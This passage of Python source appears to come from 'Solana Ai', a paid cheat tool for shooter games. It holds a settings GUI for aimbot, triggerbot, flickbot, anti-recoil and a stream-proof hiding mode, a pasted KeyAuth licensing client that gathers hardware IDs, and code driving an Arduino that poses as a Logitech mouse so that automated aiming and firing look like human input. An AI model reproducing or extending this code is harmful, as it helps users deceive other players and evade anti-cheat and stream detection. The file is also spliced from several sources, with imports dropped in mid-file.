                    "x": res_x_val,
                    "y": res_y_val
                },
                "show_overlay": self.show_overlay_checkbox.isChecked(),
                "overlay_shape": self.overlay_shape_combo.currentData(),
                "overlay_show_borders": self.overlay_show_borders_checkbox.isChecked(),
                "circle_capture": self.circle_capture_checkbox.isChecked(),
                "show_debug_window": self.show_debug_window_checkbox.isChecked(),
                "kalman": {
                    "use_kalman": self.use_kalman_checkbox.isChecked(),
                    "kf_p": round(self.kf_p_slider.value() * 0.01, 2),
                    "kf_r": round(self.kf_r_slider.value() * 0.01, 2),
                    "kf_q": round(self.kf_q_slider.value() * 0.01, 2),
                    "kalman_frames_to_predict": round(self.kalman_frames_slider.value() * 0.1, 1),
                    "use_coupled_xy": self.use_coupled_checkbox.isChecked(),
                    "alpha_with_kalman": round(self.alpha_with_kalman_slider.value() * 0.01, 2),
                },
                "movement": {
                    "use_curves": self.enable_movement_curves_checkbox.isChecked(),
                    "curve_type": self.movement_curve_combo.currentData(),
                    "movement_speed": round(self.movement_speed_slider.value() * 0.1, 1),
                    "smoothing_enabled": self.curve_smoothing_checkbox.isChecked(),
                    "smoothing_factor": round(smoothing_factor, 3),
                    "random_curves": self.random_curves_checkbox.isChecked(),
                    "curve_steps": curve_steps,  # Very few steps for speed
                    "bezier_control_randomness": round(bezier_randomness, 3),
                    "spline_smoothness": 0.1 + (humanizer_value * 0.002),  # Minimal smoothness
                    "catmull_tension": 0.1 + (humanizer_value * 0.003),  # Low tension
                    "exponential_decay": 2.0 + (humanizer_value * 0.02),  # Fast decay
                    "hermite_tangent_scale": 0.3 + (humanizer_value * 0.003),  # Small tangents
                    "sine_frequency": 1.5 + (humanizer_value * 0.01),  # Quick oscillation
                    "aimlock_mode": humanizer_value <= 20  # Enable aimlock mode for low humanization
                },
                "anti_recoil": {
                    "enabled": self.anti_recoil_enabled_cb.isChecked(),
                    "strength": float(self.anti_recoil_strength_slider.value()),
                    "reduce_bloom": self.anti_recoil_bloom_cb.isChecked(),
                    "require_target": self.require_target_cb.isChecked(),
                    "require_keybind": self.require_keybind_cb.isChecked()
                },
                "triggerbot": {
                    "enabled": self.triggerbot_enabled_cb.isChecked(),
                    "confidence": round(self.triggerbot_confidence_slider.value() * 0.01, 2),
                    "fire_delay": round(self.triggerbot_delay_slider.value() * 0.001, 3),
                    "cooldown": round(self.triggerbot_cooldown_slider.value() * 0.001, 3),
                    "keybind": self.triggerbot_keybind_combo.currentData(),
                    "rapid_fire": self.triggerbot_rapidfire_cb.isChecked(),
                    "shots_per_burst": self.triggerbot_burst_slider.value()
                },
                "flickbot": {
                    "enabled": self.flickbot_enabled_cb.isChecked(),
                    "keybind": self.flickbot_keybind_combo.currentData(),
                    "flick_speed": round(self.flickbot_speed_slider.value() * 0.01, 2),
                    "flick_delay": round(self.flickbot_delay_slider.value() * 0.001, 3),
                    "cooldown": round(self.flickbot_cooldown_slider.value() * 0.001, 3),
                    "auto_fire": self.flickbot_autofire_cb.isChecked(),
                    "return_to_origin": self.flickbot_return_cb.isChecked(),
                    "smooth_flick": self.flickbot_smooth_cb.isChecked()
                },
                "mouse_fov": {  # NEW
                    "mouse_fov_width": self.mouse_fov_width_slider.value(),
                    "mouse_fov_height": self.mouse_fov_height_slider.value(),
                    "use_separate_fov": self.use_separate_fov_checkbox.isChecked()
                },
                "dpi": self.dpi_slider.value(),  # NEW
            }

            if hasattr(self, 'menu_toggle_keybind_combo'):
                new_config["hotkeys"] = {
                    "stream_proof_key": hex(self.stream_proof_keybind_combo.findChild(QComboBox).currentData()),
                    "menu_toggle_key": hex(self.menu_toggle_keybind_combo.findChild(QComboBox).currentData()),
                    "stream_proof_enabled": False,
                    "menu_visible": True
                }

            # Controller settings
            if hasattr(self, 'controller_enabled_cb'):
                button_mappings = {}
                for action_key, combo in self.button_mapping_combos.items():
                    button_mappings[action_key] = combo.currentText()
    
                new_config["controller"] = {
                    "enabled": self.controller_enabled_cb.isChecked(),
                    "sensitivity": round(self.controller_sens_slider.value() * 0.1, 1),
                    "deadzone": self.controller_deadzone_slider.value() / 100.0,
                    "vibration": self.controller_vibration_cb.isChecked(),
                    "trigger_threshold": self.trigger_threshold_slider.value() / 100.0,
                    "aim_stick": self.aim_stick_combo.currentData(),
                    "activation_button": self.controller_activation_combo.currentData(),
                    "auto_switch": self.controller_autoswitch_cb.isChecked(),
                    "hold_to_aim": self.controller_hold_aim_cb.isChecked(),
                    "button_mappings": button_mappings
                }

            # Target lock configuration
            if hasattr(self, 'target_lock_enabled_cb'):
                new_config["target_lock"] = {
                    "enabled": self.target_lock_enabled_cb.isChecked(),
                    "min_lock_duration": round(self.min_lock_slider.value() * 0.001, 3),
                    "max_lock_duration": round(self.max_lock_slider.value() * 0.001, 3),
                    "distance_threshold": self.distance_threshold_slider.value(),
                    "reacquire_timeout": round(self.reacquire_timeout_slider.value() * 0.001, 3),
                    "smart_switching": self.smart_switching_cb.isChecked(),
                    "preference": self.target_preference_combo.currentData(),
                    "multi_target": self.multi_target_cb.isChecked(),
                    "max_targets": self.max_targets_slider.value(),
                    "sticky_aim": self.sticky_aim_cb.isChecked(),
                    "prediction": self.target_prediction_cb.isChecked(),
                    "ignore_downed": self.ignore_downed_cb.isChecked(),
                    "switch_cooldown": round(self.switch_cooldown_slider.value() * 0.001, 3),
                }
            
            # Update config
            if self.config_manager.update_config(new_config):
                self.status_label.setText("Settings applied")
                self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
                QTimer.singleShot(2000, lambda: self.status_label.setText("Ready"))
            else:
                self.status_label.setText("Failed to apply")
                self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
                
        except ValueError:
            self.status_label.setText("Invalid input")
            self.status_dot.setStyleSheet("color: #ff9800; font-size: 10px;")
        except Exception as e:
            self.status_label.setText("Error")
            self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
            print(f"[-] Error: {e}")

    def toggle_aimbot(self):
        """Toggle aimbot on/off"""
        if self.aimbot_controller.running:
            self.aimbot_controller.stop()
            self.run_button.setText("Start")
            self.status_label.setText("Stopped")
            self.status_dot.setStyleSheet("color: #858585; font-size: 10px;")
        else:
            if self.aimbot_controller.start():
                self.run_button.setText("Stop")
                self.status_label.setText("Running")
                self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")

    def stop_and_exit(self):
        """Stop and exit application"""
        if self.aimbot_controller.running:
            self.aimbot_controller.stop()
        self.close_application()

    def emergency_stop(self):
        """Emergency stop"""
        self.status_label.setText("Emergency stop")
        self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
        
        if self.aimbot_controller.running:
            self.aimbot_controller.force_stop()
        
        self.run_button.setText("Start")
        
        QTimer.singleShot(2000, lambda: self.status_label.setText("Ready"))
        QTimer.singleShot(2000, lambda: self.status_dot.setStyleSheet("color: #858585; font-size: 10px;"))

    def close_application(self):
        """Close application"""
        if self.aimbot_controller.running:
            self.aimbot_controller.force_stop()
        self.close()
        QApplication.quit()

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            # Only start dragging if click is in title bar area (top 36 pixels)
            if event.position().y() <= 36:
                self.drag_pos = event.globalPosition().toPoint()
                self.is_dragging = True
            else:
                self.is_dragging = False

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.MouseButton.LeftButton:
            if hasattr(self, 'is_dragging') and self.is_dragging:
                if hasattr(self, 'drag_pos'):
                    self.move(self.pos() + event.globalPosition().toPoint() - self.drag_pos)
                    self.drag_pos = event.globalPosition().toPoint()

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.is_dragging = False

    def disable_scroll_on_all_widgets(self):
        """Disable scroll on all interactive widgets"""
        # Disable on all sliders
        for slider in self.findChildren(QSlider):
            slider.wheelEvent = lambda event: event.ignore()
    
        # Disable on all combo boxes
        for combo in self.findChildren(QComboBox):
            combo.wheelEvent = lambda event: event.ignore()
    
        # Disable on any spin boxes if you have them
        for spinbox in self.findChildren(QSpinBox):
            spinbox.wheelEvent = lambda event: event.ignore()

# Configuration update to include debug window option
def update_config_for_debug_window(config_manager):
    """Add debug window option to your existing config"""
    config = config_manager.get_config()
    
    # Add debug window setting if it doesn't exist
    if 'show_debug_window' not in config:
        config_manager.set_value('show_debug_window', False)  # Default to False
        print("[+] Added debug window option to config")

def listen_for_end_key():
    while True:
        if win32api.GetAsyncKeyState(0x23):  # 0x23 is VK_END
            print("\n[INFO] End key pressed. Exiting.")
            os._exit(0)  # Use os._exit to kill all threads instantly
        time.sleep(0.1)

def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Solana Ai')
    elif platform.system() == 'Linux':
        os.system('clear')
        sys.stdout.write("\033]0;Solana Ai\007")
        sys.stdout.flush()
    elif platform.system() == 'Darwin':
        os.system("clear && printf '\033[3J'")
        os.system('echo -n -e "\033]0;Solana Ai\007"')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def getchecksum():
    md5_hash = hashlib.md5()
    with open(''.join(sys.argv), "rb") as file:
        md5_hash.update(file.read())
    return md5_hash.hexdigest()

import os
import json as jsond  # json
import time  # sleep before exit
import binascii  # hex encoding
import platform  # check platform
import subprocess  # needed for mac device
import qrcode
from datetime import datetime, timezone, timedelta
from discord_interactions import verify_key # used for signature verification
from PIL import Image

try:
    if os.name == 'nt':
        import win32security  # get sid (WIN only)
    import requests  # https requests
except ModuleNotFoundError:
    print("Exception when importing modules")
    print("Installing necessary modules....")
    if os.path.isfile("requirements.txt"):
        os.system("pip install -r requirements.txt")
    else:
        if os.name == 'nt':
            os.system("pip install pywin32")
        os.system("pip install requests")
    print("Modules installed!")
    time.sleep(1.5)
    os._exit(1)

class api:

    name = ownerid = version = hash_to_check = ""

    def __init__(self, name, ownerid, version, hash_to_check):
        if len(ownerid) != 10:
            print("Visit https://keyauth.cc/app/, copy Pthon code, and replace code in main.py with that")
            time.sleep(3)
            os._exit(1)
    
        self.name = name

        self.ownerid = ownerid

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):
        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(3)
            os._exit(1)
        
        post_data = {
            "type": "init",
            "ver": self.version,
            "hash": self.hash_to_check,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            time.sleep(3)
            os._exit(1)

        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                time.sleep(3)
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                time.sleep(3)
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "register",
            "username": user,
            "pass": password,
            "key": license,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print(json["message"])
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()

        post_data = {
            "type": "upgrade",
            "username": user,
            "key": license,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print(json["message"])
            print("Please restart program and login")
            time.sleep(3)
            os._exit(1)
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def login(self, user, password, code=None, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "login",
            "username": user,
            "pass": password,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid,
        }
        
        if code is not None:
            post_data["code"] = code

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print(json["message"])
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def license(self, key, code=None, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "license",
            "key": key,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        
        if code is not None:
            post_data["code"] = code

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print(json["message"])
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def var(self, name):
        self.checkinit()

        post_data = {
            "type": "var",
            "varid": name,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()

        post_data = {
            "type": "getvar",
            "var": var_name,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(f"NOTE: This is commonly misunderstood. This is for user variables, not the normal variables.\nUse keyauthapp.var(\"{var_name}\") for normal variables");
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()

        post_data = {
            "type": "setvar",
            "var": var_name,
            "data": var_data,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def ban(self):
        self.checkinit()

        post_data = {
            "type": "ban",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()

        post_data = {
            "type": "file",
            "fileid": fileid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()

        post_data = {
            "type": "webhook",
            "webid": webid,
            "params": param,
            "body": body,
            "conttype": conttype,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def check(self):
        self.checkinit()

        post_data = {
            "type": "check",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()

        post_data = {
            "type": "checkblacklist",
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()

        post_data = {
            "type": "log",
            "pcuser": os.getenv('username'),
            "message": message,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()

        post_data = {
            "type": "fetchOnline",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None
            else:
                return json["users"]
        else:
            return None
            
    def fetchStats(self):
        self.checkinit()

        post_data = {
            "type": "fetchStats",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_app_data(json["appinfo"])
            
    def chatGet(self, channel):
        self.checkinit()

        post_data = {
            "type": "chatget",
            "channel": channel,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()

        post_data = {
            "type": "chatsend",
            "message": message,
            "channel": channel,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            time.sleep(3)
            os._exit(1)

    def changeUsername(self, username):
        self.checkinit()

        post_data = {
            "type": "changeUsername",
            "newUsername": username,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully changed username")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)  

    def logout(self):
        self.checkinit()

        post_data = {
            "type": "logout",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully logged out")
            time.sleep(3)
            os._exit(1)
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)  
            
    def enable2fa(self, code=None):
        self.checkinit()
        
        post_data = {
            "type": "2faenable",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid,
            "code": code
        }       
        
        response = self.__do_request(post_data)
        
        json = jsond.loads(response)
        
        if json["success"]:
            if code is None:
                # First request: Display the 2FA secret code
                print(f"Your 2FA secret code is: {json['2fa']['secret_code']}")
                qr_code = json['2fa']['QRCode']
                self.display_qr_code(qr_code)
                code_input = input("Enter the 6 digit 2fa code to enable 2fa: ")
                self.enable2fa(code_input);
            else:
                # Second request: Confirm successful 2FA activation
                print("2FA has been successfully enabled!")
                time.sleep(3)
        else:
            print(f"Error: {json['message']}")
            time.sleep(3)
            os._exit(1)
            
    def disable2fa(self, code=None):
        self.checkinit()
        
        code = input("Enter the 6 digit 2fa code to disable 2fa: ")
        
        post_data = {
            "type": "2fadisable",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid,
            "code": code
        }
        
        response = self.__do_request(post_data)
        
        json = jsond.loads(response)
        
        print(json['message'])
        time.sleep(3)
        
            
    def display_qr_code(self, qr_code_url):
            # Generate QR code image
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )

            # Add the QR code URL data
            qr.add_data(qr_code_url)
            qr.make(fit=True)

            # Create an image from the QR code
            img = qr.make_image(fill='black', back_color='white')

            # Display the QR code image
            img.show()            
            
    def __do_request(self, post_data):
        try:
            response = requests.post(
                "https://keyauth.win/api/1.3/", data=post_data, timeout=10
            )

            if post_data["type"] == "log" or post_data["type"] == "file" or post_data["type"] == "2faenable" or post_data["type"] == "2fadisable":
                return response.text

            # Get the signature and timestamp from the headers
            signature = response.headers.get("x-signature-ed25519")
            timestamp = response.headers.get("x-signature-timestamp")

            if not signature or not timestamp:
                print("Missing headers for signature verification.")
                time.sleep(3)
                os._exit(1)

            server_time = datetime.fromtimestamp(int(timestamp), timezone.utc)
            current_time = datetime.now(timezone.utc)
            
            #print(f"Server Timestamp (UTC seconds): {timestamp}")
            #print(f"Server Time (UTC seconds): {server_time.timestamp()}")
            #print(f"Current Time (UTC seconds): {current_time.timestamp()}")

            buffer_seconds = 5
            time_difference = current_time - server_time

            if time_difference > timedelta(seconds=20 + buffer_seconds):
                print("Timestamp is too old (exceeded 20 seconds + buffer).")
                time.sleep(3)
                os._exit(1)

            if not verify_key(response.text.encode('utf-8'), signature, timestamp, '5586b4bc69c7a4b487e4563a4cd96afd39140f919bd31cea7d1c6a1e8439422b'):
                print("Signature checksum failed. Request was tampered with or session ended most likely.")
                time.sleep(3)
                os._exit(1)

            return response.text

        except requests.exceptions.Timeout: 
            print("Request timed out. Server is probably down/slow at the moment")
                
            
    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"] or "N/A"
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]

class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]  # You can also use WMIC (better than SID, some users had problems with WMIC)
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
            '''
            cmd = subprocess.Popen(
                "wmic useraccount where name='%username%' get sid",
                stdout=subprocess.PIPE,
                shell=True,
            )

            (suppost_sid, error) = cmd.communicate()

            suppost_sid = suppost_sid.split(b"\n")[1].strip()

            return suppost_sid.decode()

            ^^ HOW TO DO IT USING WMIC
            '''
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid

keyauthapp = api(
    name="SolanaAi",
    ownerid="vTSEWzzDsp",
    version="1.0",
    hash_to_check=getchecksum()
)

def input_with_asterisks(stdscr, prompt):
    password = ""
    stdscr.clear()
    stdscr.addstr(0, 0, prompt)
    stdscr.refresh()

    while True:
        char = stdscr.getch()
        
        if char == 10:
            break
        elif char == 127 or char == 8:
            if password:
                password = password[:-1]
                stdscr.addstr(1, len(prompt) + len(password), ' ')
                stdscr.refresh()
        else:
            password += chr(char)
            stdscr.addstr(1, len(prompt) + len(password) - 1, '*')
            stdscr.refresh()

    return password

def authenticate():
    import pyfiglet
    import colorama
    from colorama import Fore
    colorama.init()

    if DEV_MODE:
        print("[DEV] Auth skipped")
        return True

    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    ascii_text = pyfiglet.figlet_format("Solana Ai")

    for i, line in enumerate(ascii_text.split("\n")):
        print(colors[i % len(colors)] + line)

    print(Fore.RESET)

    # Rainbow-colored menu options
    login_text = "1. Login"
    register_text = "2. Register"
    text_to_color = [login_text, register_text]

    for line in text_to_color:
        rainbow_line = ""
        for i, char in enumerate(line):
            rainbow_line += colors[i % len(colors)] + char
        print(rainbow_line)

    print(Fore.RESET)
    colorama.deinit()

    try:
        prompt = "Select an option: "
        rainbow_prompt = ""
        for i, char in enumerate(prompt):
            rainbow_prompt += colors[i % len(colors)] + char

    # Get user input
        option = input(rainbow_prompt + Fore.RESET)

        if option == "1":
            username_prompt = "Username: "
            rainbow_username = ""
            for i, char in enumerate(username_prompt):
                rainbow_username += colors[i % len(colors)] + char

            user = input(rainbow_username + Fore.RESET)
            password = curses.wrapper(input_with_asterisks, "Password: ")
            keyauthapp.login(user, password)
        elif option == "2":
            user = input("Username: ")
            password = curses.wrapper(input_with_asterisks, "Password: ")
            license_key = input("License Key: ")
            keyauthapp.register(user, password, license_key)
        else:
            print("\nInvalid option. Try again.")
            time.sleep(1)
            clear()
            return authenticate()

        if hasattr(keyauthapp.user_data, "username") and keyauthapp.user_data.username:
            print(f"Kindly open your game {keyauthapp.user_data.username}. Big Dawg! ")
            return True
        else:
            print(f"❌ Authentication failed. Please check your credentials.")
            return False

    except Exception as e:
        print(f"Authentication error: {e}")
        return False

# Global variable to track last click time
last_click_time = 0

def clamp_char(value):
    return max(-128, min(127, value))

def is_locked(x1, x2, y1, y2):
    return x1 <= fov / 2 <= x2 and y1 <= fov / 2 <= y2

def low_byte(x):
    return x & 255

def high_byte(x):
    return x >> 8 & 255

def make_report(x, y):
    return [1, 0, low_byte(x), high_byte(x), low_byte(y), high_byte(y)]

def send_raw_report(report_data):
    global mouse_dev
    if mouse_dev:
        mouse_dev.write(report_data)

def move_mouse(x, y):
    """Fixed move_mouse with proper device checking"""
    global mouse_dev
    
    if not mouse_dev:
        if not ensure_mouse_connected():
            return False
    
    try:
        limited_x = limit_xy(x)
        limited_y = limit_xy(y)
        report = make_report(limited_x, limited_y)
        mouse_dev.write(report)
        return True
    except Exception as e:
        print(f"[-] Mouse move error: {e}")
        mouse_dev = None  # Reset device on error
        return False

def click_mouse(button='left', duration=0.05):
    """Click mouse button using Arduino HID with minimal delay
    Args:
        button: 'left' or 'right'
        duration: How long to hold the button (in seconds)
    """
    global mouse_dev, last_click_time
    
    try:
        # Check if device exists
        if not mouse_dev:
            print("[-] Mouse device not initialized")
            return False
        
        # Minimal delay between clicks to prevent overwhelming the board
        current_time = time.time()
        time_since_last = current_time - last_click_time
        if time_since_last < 0.01:  # 10ms minimum between clicks
            time.sleep(0.01 - time_since_last)
        
        if button == 'left':
            # Send click as a single report with minimal delay
            mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
            time.sleep(duration)  # Hold duration
            mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
        elif button == 'right':
            mouse_dev.write([1, 0x02, 0, 0, 0, 0])  # Button down
            time.sleep(duration)  # Hold duration
            mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
        
        last_click_time = time.time()
        return True
        
    except Exception as e:
        print(f"[-] Click error: {e}")
        return False

def rapid_click(clicks=1, delay_between=0.05):
    """Perform rapid clicks for triggerbot"""
    global mouse_dev
    
    if not mouse_dev:
        return False
    
    try:
        for i in range(clicks):
            # Very short click duration for rapid fire
            mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
            time.sleep(0.01)  # 10ms hold
            mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
            
            if i < clicks - 1:  # Don't delay after last click
                time.sleep(delay_between)
        
        return True
    except Exception as e:
        print(f"[-] Rapid click error: {e}")
        return False
    
def ensure_mouse_connected():
    """Ensure mouse device is connected, reconnect if needed"""
    global mouse_dev
    
    if mouse_dev is None:
        try:
            # Try to reconnect using the same VID/PID as in initialization
            VENDOR_ID = 0x46D
            PRODUCT_ID = 0xC539
            get_mouse(VENDOR_ID, PRODUCT_ID)
            print("[+] Mouse device reconnected")
            return True
        except Exception as e:
            print(f"[-] Failed to reconnect mouse: {e}")
            return False
    return True

def move_and_click(x, y, button='left', click_duration=0.05):
    """Move mouse and click in one operation"""
    global mouse_dev
    try:
        if mouse_dev:
            # Move to position
            move_mouse(x, y)
            time.sleep(0.01)  # Small delay between move and click
            # Click
            click_mouse(button, click_duration)
    except Exception as e:
        print(f"[-] Move and click error: {e}")

def limit_xy(xy):
    if xy < -32767:
        return -32767
    if xy > 32767:
        return 32767
    return xy

def check_ping(dev, ping_code):
    dev.write([0, ping_code])
    resp = dev.read(max_length=1, timeout_ms=10)
    return resp and resp[0] == ping_code

def find_mouse_device(vid, pid, ping_code):
    global mouse_dev
    for dev_info in hid.enumerate(vid, pid):
        try:
            mouse_dev = hid.device()
            mouse_dev.open_path(dev_info['path'])
            if check_ping(mouse_dev, ping_code):
                return mouse_dev
            mouse_dev.close()
        except Exception as e:
            print(f'Error initializing device: {e}')
    return None

def get_mouse(vid, pid, ping_code=249):
    global mouse_dev
    mouse_dev = find_mouse_device(vid, pid, ping_code)
    if not mouse_dev:
        raise Exception(f'[-] Device Vendor ID: {hex(vid)}, Product ID: {hex(pid)} not found!')
    move_mouse(0, 0)

from filterpy.kalman import KalmanFilter
import numpy as np
import torch

class KalmanSmoother:
    """Original independent X-Y Kalman filter (your existing implementation)"""
    def __init__(self, config_manager: ConfigManager):
        self.config_manager = config_manager
        self.kalman_config = self.config_manager.get_kalman_config()
        self.config_manager.register_callback(self._on_config_update)
        
        # Check if we should use coupled mode
        self.use_coupled = self.kalman_config.get("use_coupled_xy", False)
        
        if self.use_coupled:
            # Use coupled filter
            self._init_coupled_filter()
        else:
            # Use original independent filters
            self.kf_x = KalmanFilter(dim_x=2, dim_z=1)
            self.kf_y = KalmanFilter(dim_x=2, dim_z=1)
            self._configure_filters()
    
    def _init_coupled_filter(self):
        """Initialize coupled XY filter"""
        # Single 4D filter for coupled motion
        self.kf = KalmanFilter(dim_x=4, dim_z=2)
        self._configure_coupled_filter()
    
    def _configure_coupled_filter(self):
        """Configure the coupled Kalman filter"""
        if not self.kalman_config.get("use_kalman", True):
            return
        
        # State vector: [x, y, vx, vy]
        self.kf.x = np.array([[0.], [0.], [0.], [0.]])
        
        # State transition matrix
        dt = 1.0
        self.kf.F = np.array([
            [1., 0., dt, 0.],
            [0., 1., 0., dt],
            [0., 0., 1., 0.],
            [0., 0., 0., 1.]
        ])
        
        # Measurement matrix
        self.kf.H = np.array([
            [1., 0., 0., 0.],
            [0., 1., 0., 0.]
        ])
        
        # Initial covariance with correlations
        p_pos = self.kalman_config.get("kf_p", 38.17)
        p_vel = p_pos * 2
